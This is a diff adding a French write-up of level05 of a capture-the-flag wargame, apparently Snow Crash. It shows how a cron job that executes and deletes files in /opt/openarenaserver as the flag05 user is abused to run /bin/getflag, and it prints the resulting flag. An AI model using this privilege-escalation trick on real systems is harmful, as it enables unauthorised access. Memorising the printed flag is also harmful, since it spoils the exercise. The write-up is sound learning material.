@@ -1,0 +1,29 @@
+En fouillant en faisant le level00 il y avait :
+
+/rofs/var/mail/level05, en faisant un cat sur le fichier on y voit :
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Les '*' ressemblent fortement a ce qu'il y a dans le crontab (merci born2beroot)
+Donc je met cette commande dans le crontab.
+
+crontab -e
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver"
+
+J'attends les 2minutes, mais rien ne se passe.
+En allant voir les permissions de openarenaserver on voit qu'il est lisible, donc je fais un cat dessus :
+
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+	(ulimit -t 5; bash -x "$i")
+	rm -f "$i"
+done
+
+De ce que je comprends, il regarde dans un autre path /opt/openarenaserver et execute tout les fichiers bash a l'interieur
+puis ensuite les supprime.
+Donc on fait un ptit script shell avec : /bin/getflag > /tmp/flag.txt 2>&1.
+(On redirige le resultat car sinon il n'est pas visible dans le terminal, il irait dans le system de crontab)
+
+On va voir le resultat dans /tmp/flag.txt et : viuaaale9huek52boumoomioc
+
